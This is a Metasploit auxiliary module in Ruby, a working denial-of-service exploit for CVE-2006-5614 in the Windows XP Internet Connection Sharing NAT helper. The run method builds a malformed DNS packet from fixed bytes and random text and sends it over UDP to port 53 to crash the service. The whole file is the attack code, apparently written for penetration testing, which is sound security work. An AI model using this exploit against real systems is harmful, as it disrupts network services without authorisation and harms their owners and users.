##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows NAT Helper Denial of Service',
        'Description' => %q{
          This module exploits a denial of service vulnerability
          within the Internet Connection Sharing service in
          Windows XP.
        },
        'Author' => [ 'MC' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'OSVDB', '30096'],
          [ 'BID', '20804' ],
          [ 'CVE', '2006-5614' ],
        ],
        'DisclosureDate' => '2006-10-26',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([Opt::RPORT(53),])
  end

  def run
    connect_udp

    pkt = "\x6c\xb6\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    pkt << "\x03" + Rex::Text.rand_text_english(3) + "\x06"
    pkt << Rex::Text.rand_text_english(10) + "\x03"
    pkt << Rex::Text.rand_text_english(3)
    pkt << "\x00\x00\x01\x00\x01"

    print_status('Sending dos packet...')

    udp_sock.put(pkt)

    disconnect_udp
  end
end
